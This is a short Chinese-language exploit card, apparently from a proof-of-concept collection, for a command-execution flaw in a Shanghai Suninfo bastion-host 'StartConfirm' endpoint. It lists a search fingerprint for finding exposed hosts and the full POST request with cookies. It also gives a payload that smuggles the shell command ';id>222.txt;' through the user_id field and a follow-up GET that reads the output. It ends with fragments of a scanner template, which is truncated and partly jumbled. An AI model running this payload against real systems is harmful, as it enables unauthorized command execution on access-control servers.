# 上海上讯信息技术股份有限公司堡垒机StartConfirm命令执行漏洞

- **系统**：上海上讯信息技术股份有限公司堡垒机StartConfirm　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="default/getloginhtml"`
- **请求**：`POST /default/StartConfirm/ HTTP/1.1`
- **关键头**：`Cookie: localecookie=a%3A3%3A%7Bs%3A12%3A%22DEFAULT_LANG%22%3Bs%3A11%3A%22zh_CN.UTF-8%22…`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 78`　`id: shangxun-baoleiji-startconfirm-rce`　`name: shangxun-baoleiji-startconfirm-rce`　`author: 1`　`severity: high`　`description: Remote Code Execution in shangxun-baoleiji-startconfirm endpoint.`

**请求体 / payload**
```
username=1&user_id=;id>222.txt;&google_key_dec=1&safety_code1=1&safety_code2=1
GET /222.txt HTTP/1.1
Host:
Cookie: localecookie=a%3A3%3A%7Bs%3A12%3A%22DEFAULT_LANG%22%3Bs%3A11%3A%22zh_CN.UTF-8%22%3Bs%3A12%3A%22FIELD_PREFIX%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22PACKAGE%22%3Bs%3A3%3A%22oma%22%3B%7D; PHPSESSID=250f96a3997ead2efeea9d7af462ea51
- raw:
-
Host: {{Hostname}}
Cookie: localecookie=a%3A3%3A%7Bs%3A12%3A%22DEFAULT_LANG%22%3Bs%3A11%3A%22zh_CN.UTF-8%22%3Bs%3A12%3A%22FIELD_PREFIX%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22PACKAGE%22%3Bs%3A3%3A%22oma%22%3B%7D; PHPSESSID={{SessionID}}
Content-Type: applicatio…（脚本共 1066 字，完整版见原文）
```
- **预期**：200　|　—